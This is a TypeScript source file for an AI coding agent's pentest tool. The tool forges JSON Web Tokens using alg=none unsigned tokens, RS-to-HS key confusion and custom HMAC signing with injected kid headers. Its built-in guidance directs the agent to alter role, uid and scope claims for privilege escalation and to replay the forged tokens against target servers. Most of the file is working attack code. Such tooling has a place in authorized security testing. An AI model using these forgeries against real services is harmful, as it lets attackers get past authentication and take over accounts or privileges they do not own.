/**
 * JWT inspection and attack forging — the executable counterpart of the
 * jwt-saml class methodology. Everything runs locally on node:crypto; no
 * network I/O.
 *
 * Attacks implemented (each maps to a technique in skills/web-pentest/classes/jwt-saml.md):
 * - `decode`       — structural analysis: header/claims, algorithm, expiry,
 *                    signature presence. The first step of every JWT attack.
 * - `alg_none`     — re-sign the payload with {"alg":"none"} and an empty
 *                    signature (trailing dot). Works when the verifier trusts
 *                    the token's own alg header.
 * - `key_confusion`— RS/ES/PS-signed token re-signed as HS* using the PUBLIC
 *                    key PEM as the HMAC secret. Works when the verifier picks
 *                    the verification algorithm from the header and feeds it
 *                    whatever key material it has.
 * - `sign`         — legitimate HS* signing with a caller-supplied secret,
 *                    plus arbitrary header parameters (kid injection payloads
 *                    for header-driven key lookups).
 *
 * The output is a candidate token to REPLAY against the target (e.g. via
 * http_request with an Authorization header) — a forged token is a hypothesis
 * until the target accepts it and grants the claimed access.
 */

import { createHmac, createPublicKey } from "node:crypto";
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { Text } from "@earendil-works/pi-tui";
import { Type } from "typebox";

const MAX_TOKEN_CHARS = 64 * 1024;
const ALG_TO_HASH: Record<string, string> = {
  HS256: "sha256",
  HS384: "sha384",
  HS512: "sha512",
};

function b64urlDecode(part: string): string {
  const pad = part.length % 4 === 0 ? "" : "=".repeat(4 - (part.length % 4));
  return Buffer.from(part.replace(/-/g, "+").replace(/_/g, "/") + pad, "base64").toString("utf8");
}

function b64urlEncode(input: Buffer | string): string {
  return Buffer.from(input)
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

type ParsedJwt = {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signaturePart: string;
  signingInput: string;
};

function parseJwt(token: string): ParsedJwt {
  if (token.length > MAX_TOKEN_CHARS) {
    throw new Error(`token exceeds ${MAX_TOKEN_CHARS} characters`);
  }
  const parts = token.trim().split(".");
  // alg:none tokens legitimately have an empty third part; the first two may not be empty.
  if (parts.length !== 3 || !parts[0] || !parts[1]) {
    throw new Error("token is not a JWS compact form (header.payload.signature)");
  }
  let header: Record<string, unknown>;
  let payload: Record<string, unknown>;
  try {
    header = JSON.parse(b64urlDecode(parts[0]));
    payload = JSON.parse(b64urlDecode(parts[1]));
  } catch (e) {
    throw new Error(`token segments are not valid base64url JSON: ${(e as Error).message}`);
  }
  if (typeof header !== "object" || typeof payload !== "object") {
    throw new Error("token header/payload must be JSON objects");
  }
  return {
    header,
    payload,
    signaturePart: parts[2],
    signingInput: `${parts[0]}.${parts[1]}`,
  };
}

function hsSign(signingInput: string, secret: string, alg: string): string {
  const hash = ALG_TO_HASH[alg];
  if (!hash) throw new Error(`unsupported HMAC algorithm ${alg}`);
  return b64urlEncode(createHmac(hash, secret).update(signingInput).digest());
}

function encodeSegment(value: unknown): string {
  return b64urlEncode(JSON.stringify(value));
}

export type JwtAttackResult = {
  action: string;
  token: string;
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  notes: string[];
};

export function jwtAttack(params: {
  action: "decode" | "alg_none" | "key_confusion" | "sign";
  token?: string;
  claims?: Record<string, unknown>;
  headerParams?: Record<string, unknown>;
  key?: string;
  alg?: string;
}): JwtAttackResult | { action: "decode"; decoded: ReturnType<typeof parseJwt>; notes: string[] } {
  const action = params.action;

  if (action === "decode") {
    if (!params.token) throw new Error("decode requires token");
    const parsed = parseJwt(params.token);
    const notes: string[] = [];
    const alg = String(parsed.header.alg ?? "(missing)");
    notes.push(`declared alg: ${alg}`);
    if (alg === "none" || parsed.signaturePart === "") {
      notes.push("unsigned token (empty signature) — verifier may accept tampered claims");
    }
    if (String(alg).startsWith("HS")) {
      notes.push(
        "HMAC-signed: try key_confusion if any RSA/public key for this issuer is known, and targeted brute force for weak secrets",
      );
    } else {
      notes.push(
        "asymmetric-signed: key_confusion applies — sign the same claims as HS256 using this issuer's PUBLIC key as the HMAC secret",
      );
    }
    const exp = parsed.payload.exp;
    if (typeof exp === "number") {
      const expired = exp * 1000 < Date.now();
      notes.push(`exp ${new Date(exp * 1000).toISOString()} — ${expired ? "EXPIRED" : "valid"}`);
    }
    const kid = parsed.header.kid;
    if (typeof kid === "string") {
      notes.push(
        `kid "${kid}" present — header-driven key lookup is injectable surface (path traversal / SQLi / SSRF via jku/x5u)`,
      );
    }
    for (const k of ["jku", "x5u", "jwk"]) {
      if (parsed.header[k])
        notes.push(`header carries ${k} — verifier may fetch attacker-controlled key material`);
    }
    return { action, decoded: parsed, notes };
  }

  if (action === "alg_none") {
    if (!params.token) throw new Error("alg_none requires the original token");
    const parsed = parseJwt(params.token);
    const header: Record<string, unknown> = {
      ...parsed.header,
      ...params.headerParams,
      alg: "none",
    };
    const payload = { ...parsed.payload, ...params.claims };
    const token = `${encodeSegment(header)}.${encodeSegment(payload)}.`;
    return {
      action,
      token,
      header,
      payload,
      notes: [
        "replay with Authorization: Bearer <token>; success = target honors claims while signature is empty",
        "some parsers reject 'none' but accept 'None'/'nOnE' — vary case if rejected",
      ],
    };
  }

  if (action === "key_confusion") {
    if (!params.token) throw new Error("key_confusion requires the original asymmetric token");
    if (!params.key) throw new Error("key_confusion requires key = the issuer's PUBLIC key PEM");
    const parsed = parseJwt(params.token);
    const declaredAlg = String(parsed.header.alg ?? "");
    if (declaredAlg.startsWith("HS")) {
      throw new Error(
        `original token is already HMAC (${declaredAlg}); key confusion targets RS/ES/PS-signed tokens`,
      );
    }
    // Validate that the PEM really parses as a public key before using it as a secret.
    try {
      createPublicKey(params.key);
    } catch {
      throw new Error(
        "key is not a parseable public key PEM (get the issuer's public key from /jwks.json, a cert, or a published key)",
      );
    }
    const alg = params.alg && ALG_TO_HASH[params.alg] ? params.alg : "HS256";
    const header: Record<string, unknown> = { ...parsed.header, ...params.headerParams, alg };
    delete header.jwk;
    const payload = { ...parsed.payload, ...params.claims };
    const signingInput = `${encodeSegment(header)}.${encodeSegment(payload)}`;
    const token = `${signingInput}.${hsSign(signingInput, params.key, alg)}`;
    return {
      action,
      token,
      header,
      payload,
      notes: [
        `signed as ${alg} with the public key PEM as the HMAC secret`,
        "works only if the verifier selects the algorithm from the token header instead of a fixed one",
        "replay and compare privileged-response differentials, not just status codes",
      ],
    };
  }

  // action === "sign"
  if (!params.key) throw new Error("sign requires key (HMAC secret)");
  const alg = params.alg && ALG_TO_HASH[params.alg] ? params.alg : "HS256";
  const header: Record<string, unknown> = { alg, typ: "JWT", ...params.headerParams };
  const payload = { ...(params.claims ?? {}) };
  const signingInput = `${encodeSegment(header)}.${encodeSegment(payload)}`;
  const token = `${signingInput}.${hsSign(signingInput, params.key, alg)}`;
  return {
    action,
    token,
    header,
    payload,
    notes: [
      "fully caller-specified claims — craft privesc bodies (role escalation, uid swap) and replay",
      "kid injection: put the payload for the target's key-lookup bug into headerParams.kid",
    ],
  };
}

const ActionParam = Type.String({
  enum: ["decode", "alg_none", "key_confusion", "sign"],
});

export default function jwtExtension(pi: ExtensionAPI) {
  pi.registerTool({
    name: "jwt",
    label: "JWT Attack",
    description:
      "Decode JWTs and forge attack variants locally (no network): structural decode with weakness analysis, alg=none unsigned forgery, RS->HS key-confusion signing with a public key PEM, and fully custom HS* signing with attacker-controlled claims/header params (kid injection). Output is a candidate token to REPLAY against the target — pair with http_request; the attack is proven by the target accepting it, not by the forgery itself.",
    promptSnippet: "Decode JWTs and forge alg-none / key-confusion / custom-signature variants",
    promptGuidelines: [
      "Start with action:'decode' — the reported weaknesses dictate the attack: unsigned -> alg_none; RS/ES/PS + known public key -> key_confusion; weak-looking secret -> offline guess then sign.",
      "For key_confusion, supply key as the PEM text of the issuer's public key (from /jwks.json, a cert, or a published key); the tool signs the SAME claims as HS256 using that PEM as the HMAC secret.",
      "Use claims to escalate: copy the victim payload and change role/uid/scope fields; keep iat/exp plausible.",
      "A forged token is a HYPOTHESIS. Replay it (Authorization header via http_request) and prove acceptance with a privileged response differential — then promote via the normal gate.",
    ],
    parameters: Type.Object(
      {
        action: ActionParam,
        token: Type.Optional(
          Type.String({ description: "The original JWT (compact form) to analyze or mutate." }),
        ),
        claims: Type.Optional(
          Type.Record(Type.String(), Type.Unknown(), {
            description:
              "Claim overrides merged over the original payload (or the full body for sign).",
          }),
        ),
        headerParams: Type.Optional(
          Type.Record(Type.String(), Type.Unknown(), {
            description:
              "Extra header parameters (e.g. kid injection payloads) merged over the header.",
          }),
        ),
        key: Type.Optional(
          Type.String({
            description: "HMAC secret for sign; PUBLIC key PEM for key_confusion.",
          }),
        ),
        alg: Type.Optional(
          Type.String({
            enum: Object.keys(ALG_TO_HASH),
            description: "HMAC variant (default HS256).",
          }),
        ),
      },
      { additionalProperties: false },
    ),

    async execute(_id, params, _signal, _onUpdate, _ctx) {
      try {
        const result = jwtAttack({
          action: params.action as "decode" | "alg_none" | "key_confusion" | "sign",
          token: params.token as string | undefined,
          claims: params.claims as Record<string, unknown> | undefined,
          headerParams: params.headerParams as Record<string, unknown> | undefined,
          key: params.key as string | undefined,
          alg: params.alg as string | undefined,
        });
        let text: string;
        if ("decoded" in result) {
          const d = result.decoded;
          text =
            `header: ${JSON.stringify(d.header)}\n` +
            `payload: ${JSON.stringify(d.payload)}\n` +
            `signature: ${d.signaturePart ? `${d.signaturePart.slice(0, 24)}…` : "(EMPTY)"}\n` +
            result.notes.map((n) => `- ${n}`).join("\n");
        } else {
          text =
            `forged (${result.action}) token:\n${result.token}\n\n` +
            `header: ${JSON.stringify(result.header)}\n` +
            `payload: ${JSON.stringify(result.payload)}\n` +
            result.notes.map((n) => `- ${n}`).join("\n");
        }
        return { content: [{ type: "text" as const, text }], details: result };
      } catch (err) {
        throw new Error(`jwt failed: ${(err as Error).message}`, { cause: err });
      }
    },

    renderCall(args, theme) {
      return new Text(
        theme.fg("toolTitle", theme.bold("JWT ")) + theme.fg("dim", String(args.action ?? "")),
        0,
        0,
      );
    },

    renderResult(result, _opts, theme, context) {
      if (context.isError) return new Text(theme.fg("error", "✗ jwt failed"), 0, 0);
      const d = result.details as { action?: string } | undefined;
      return new Text(theme.fg("success", "✓ ") + theme.fg("dim", d?.action ?? ""), 0, 0);
    },
  });
}
